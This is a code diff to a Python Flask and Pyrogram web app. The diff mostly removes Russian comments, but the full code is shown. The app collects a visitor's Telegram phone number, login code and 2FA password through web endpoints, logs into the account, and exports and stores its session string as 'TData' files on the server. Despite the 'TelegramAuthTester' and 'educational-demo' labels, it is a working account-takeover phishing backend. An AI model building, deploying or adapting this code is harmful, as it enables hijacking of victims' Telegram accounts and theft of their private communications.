@@ -19,22 +19,18 @@ from pyrogram.errors import (
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Создаем Flask приложение ПЕРВЫМ делом
 app = Flask(__name__, template_folder='templates')
 
-# Добавляем обработку статических файлов СРАЗУ после создания app
 @app.route('/static/<path:filename>')
 def serve_static(filename):
     return send_from_directory('templates', filename)
 
 class JSONStorageManager:
-    """Менеджер JSON хранилища"""
     def __init__(self):
         self.storage_path = "./tdata_storage"
         self.init_storage()
     
     def init_storage(self):
-        """Инициализация хранилища"""
         try:
             os.makedirs(f"{self.storage_path}/users", exist_ok=True)
             os.makedirs(f"{self.storage_path}/sessions", exist_ok=True)
@@ -44,7 +40,6 @@ class JSONStorageManager:
             logger.error(f"❌ Ошибка инициализации хранилища: {e}")
     
     def save_user(self, user_data):
-        """Сохранение пользователя"""
         try:
             user_file = f"{self.storage_path}/users/{user_data['id']}.json"
             with open(user_file, 'w', encoding='utf-8') as f:
@@ -55,7 +50,6 @@ class JSONStorageManager:
             return False
     
     def save_session(self, user_id, session_data, request_info=None):
-        """Сохранение сессии"""
         try:
             session_id = int(time.time() * 1000)
             session_file = f"{self.storage_path}/sessions/{session_id}.json"
@@ -78,7 +72,6 @@ class JSONStorageManager:
             return None
     
     def save_tdata(self, user_id, session_id, tdata_json):
-        """Сохранение TData"""
         try:
             tdata_id = int(time.time() * 1000)
             tdata_file = f"{self.storage_path}/tdata/{tdata_id}.json"
@@ -100,7 +93,6 @@ class JSONStorageManager:
             return None
     
     def get_user_sessions(self, user_id):
-        """Получение сессий пользователя"""
         try:
             sessions = []
             sessions_dir = f"{self.storage_path}/sessions"
@@ -128,7 +120,6 @@ class JSONStorageManager:
             return []
     
     def get_stats(self):
-        """Статистика хранилища - ДОБАВЛЕННЫЙ МЕТОД"""
         try:
             users_dir = f"{self.storage_path}/users"
             sessions_dir = f"{self.storage_path}/sessions"
@@ -147,10 +138,8 @@ class JSONStorageManager:
             logger.error(f"❌ Ошибка получения статистики: {e}")
             return {'total_users': 0, 'active_sessions': 0, 'total_tdata_records': 0}
 
-# Инициализация хранилища
 storage = JSONStorageManager()
 
-# Создаем отдельный event loop для асинхронных операций
 class AsyncRunner:
     def __init__(self):
         self.loop = asyncio.new_event_loop()
@@ -165,10 +154,8 @@ class AsyncRunner:
         future = asyncio.run_coroutine_threadsafe(coro, self.loop)
         return future.result(timeout=30)
 
-# Глобальный runner для асинхронных операций
 async_runner = AsyncRunner()
 
-# Добавляем CORS headers
 @app.after_request
 def after_request(response):
     response.headers.add('Access-Control-Allow-Origin', '*')
@@ -177,7 +164,6 @@ def after_request(response):
     return response
 
 def load_api_keys():
-    """Загружаем API ключи с проверкой"""
     try:
         from dotenv import load_dotenv
         load_dotenv()
@@ -185,18 +171,15 @@ def load_api_keys():
     except ImportError:
         logger.warning("⚠️ python-dotenv не установлен")
     
-    # Получаем ключи из переменных окружения
     api_id = os.getenv('TELEGRAM_API_ID')
     api_hash = os.getenv('TELEGRAM_API_HASH')
     secret_key = os.getenv('SECRET_KEY', 'educational-demo-secret-key-2024')
     
     return api_id, api_hash, secret_key
 
-# Загружаем ключи при старте
 API_ID, API_HASH, SECRET_KEY = load_api_keys()
 app.secret_key = SECRET_KEY
 
-# Хранилище активных сессий
 ACTIVE_SESSIONS = {}
 
 class TelegramAuthTester:
@@ -207,7 +190,6 @@ class TelegramAuthTester:
         self.initialize_client()
         
     def initialize_client(self):
-        """Инициализируем клиент с проверкой ключей"""
         try:
             if not API_ID or not API_HASH:
                 logger.error("❌ API ключи не установлены")
@@ -227,16 +209,13 @@ class TelegramAuthTester:
             self.initialized = False
     
     async def request_code(self, phone_number):
-        """Запрос кода аутентификации"""
         if not self.initialized:
             return {'success': False, 'error': 'Клиент не инициализирован'}
             
         client = None
         try:
-            # Создаем уникальное имя сессии
             session_id = f"{phone_number}_{int(time.time())}"
             
-            # Создаем клиента
             client = Client(
                 name=session_id,
                 api_id=self.api_id,
@@ -246,11 +225,9 @@ class TelegramAuthTester:
             
             await client.connect()
             
-            # Запрашиваем код
             logger.info(f"📱 Запрос кода для: {phone_number}")
             sent_code = await client.send_code(phone_number)
             
-            # Сохраняем сессию
             ACTIVE_SESSIONS[session_id] = {
                 'client': client,
                 'phone': phone_number,
@@ -259,7 +236,6 @@ class TelegramAuthTester:
             }
             
             logger.info(f"📱 Код отправлен. Session: {session_id}")
-            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
             
             return {
                 'success': True,
@@ -277,7 +253,6 @@ class TelegramAuthTester:
             return {'success': False, 'error': f'Ошибка: {str(e)}'}
     
     async def verify_code(self, session_id, code):
-        """Верификация кода"""
         if session_id not in ACTIVE_SESSIONS:
             return {'success': False, 'error': 'Сессия не найдена или истекла'}
             
@@ -289,7 +264,6 @@ class TelegramAuthTester:
         try:
             logger.info(f"🔐 Верификация кода {code} для {phone}")
             
-            # Пытаемся войти с кодом
             await client.sign_in(
                 phone_number=phone,
                 phone_code_hash=phone_code_hash,
@@ -298,7 +272,6 @@ class TelegramAuthTester:
             
             logger.info("✅ Успешная аутентификация")
             
-            # Получаем информацию о пользователе
             me = await client.get_me()
             user_info = {
                 'id': me.id,
@@ -308,10 +281,8 @@ class TelegramAuthTester:
                 'username': me.username
             }
             
-            # Экспортируем TData
             export_result = await self.export_tdata(client, user_info)
             
-            # Очищаем сессию
             await client.disconnect()
             del ACTIVE_SESSIONS[session_id]
             
@@ -327,7 +298,6 @@ class TelegramAuthTester:
                 
         except SessionPasswordNeeded:
             logger.info("🔒 Требуется 2FA пароль")
-            # Обновляем статус сессии
             session_data['needs_password'] = True
             ACTIVE_SESSIONS[session_id] = session_data
             
@@ -368,7 +338,6 @@ class TelegramAuthTester:
             return {'success': False, 'error': f'Ошибка: {str(e)}'}
     
     async def verify_password(self, session_id, password):
-        """Верификация пароля 2FA"""
         if session_id not in ACTIVE_SESSIONS:
             return {'success': False, 'error': 'Сессия не найдена'}
             
@@ -381,12 +350,10 @@ class TelegramAuthTester:
         try:
             logger.info("🔑 Верификация пароля 2FA")
             
-            # Входим с паролем
             await client.check_password(password=password)
             
             logger.info("✅ Успешная аутентификация с паролем 2FA")
             
-            # Получаем информацию о пользователе
             me = await client.get_me()
             user_info = {
                 'id': me.id,
@@ -396,10 +363,8 @@ class TelegramAuthTester:
                 'username': me.username
             }
             
-            # Экспортируем TData
             export_result = await self.export_tdata(client, user_info)
             
-            # Очищаем сессию
             await client.disconnect()
             del ACTIVE_SESSIONS[session_id]
             
@@ -424,16 +389,12 @@ class TelegramAuthTester:
             return {'success': False, 'error': 'Неверный пароль 2FA'}
     
     async def export_tdata(self, client, user_info, request_info=None):
-        """Экспорт TData - исправленная версия"""
         try:
-            # Экспортируем session string
             session_string = await client.export_session_string()
         
-            # Получаем информацию о дата-центре
             dc_info = await client.storage.dc_id()
-            dc_id = dc_info if dc_info else 2  # Значение по умолчанию
+            dc_id = dc_info if dc_info else 2
         
-            # Получаем базовую информацию о клиенте
             tdata_info = {
                 'version': '1.0',
                 'user_id': user_info['id'],
@@ -442,7 +403,7 @@ class TelegramAuthTester:
                 'last_name': user_info.get('last_name', ''),
                 'username': user_info.get('username', ''),
                 'session_string': session_string,
-                'dc_id': dc_id,  # Используем полученный dc_id
+                'dc_id': dc_id,
                 'api_id': self.api_id,
                 'api_hash': self.api_hash,
                 'device_model': 'Pyrogram Export',
@@ -454,13 +415,11 @@ class TelegramAuthTester:
                 'session_type': 'pyrogram_string_session'
             }
         
-            # Сохраняем пользователя
             storage.save_user(user_info)
         
-            # Сохраняем сессию
             session_data = {
                 'session_string': session_string,
-                'dc_id': dc_id,  # И здесь тоже исправляем
+                'dc_id': dc_id,
                 'api_id': self.api_id,
                 'api_hash': self.api_hash,
                 'device_model': 'Pyrogram Export',
@@ -470,19 +429,10 @@ class TelegramAuthTester:
                 'system_lang_code': 'en'
             }
         
-            session_id = storage.save_session(
-                user_info['id'], 
-                session_data, 
-                request_info
-            )
+            session_id = storage.save_session(user_info['id'], session_data, request_info)
         
             if session_id:
-                # Сохраняем полный TData
-                tdata_id = storage.save_tdata(
-                    user_info['id'], 
-                    session_id, 
-                    tdata_info
-                )
+                tdata_id = storage.save_tdata(user_info['id'], session_id, tdata_info)
             
                 logger.info(f"💾 TData сохранен. Session ID: {session_id}, TData ID: {tdata_id}")
             
@@ -501,20 +451,15 @@ class TelegramAuthTester:
             logger.error(f"❌ Ошибка экспорта TData: {e}")
             return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
 
-# Инициализация
 auth_tester = TelegramAuthTester()
 
-# 🎯 Главная страница с HTML интерфейсом
 @app.route('/')
 def home():
-    """Главная страница с космическим интерфейсом"""
-    stats = storage.get_stats()  # Теперь этот метод существует
+    stats = storage.get_stats()
     return render_template('index.html', stats=stats)
 
-# 🎯 API Endpoints
 @app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
 def request_code():
-    """Запрос кода аутентификации"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'})
         
@@ -537,7 +482,6 @@ def request_code():
 
 @app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
 def verify_code():
-    """Верификация кода"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'})
         
@@ -561,7 +505,6 @@ def verify_code():
 
 @app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
 def verify_password():
-    """Верификация пароля 2FA"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'})
         
@@ -585,9 +528,8 @@ def verify_password():
 
 @app.route('/api/storage/stats', methods=['GET'])
 def storage_stats():
-    """Статистика хранилища"""
     try:
-        stats = storage.get_stats()  # Теперь этот метод существует
+        stats = storage.get_stats()
         return jsonify({
             'success': True,
             'storage_type': 'JSON',
@@ -598,6 +540,5 @@ def storage_stats():
         return jsonify({'success': False, 'error': str(e)}), 500
 
 if __name__ == '__main__':
-    # Создаем папку templates если её нет
     os.makedirs('templates', exist_ok=True)
     app.run(host='0.0.0.0', port=8080, debug=False)
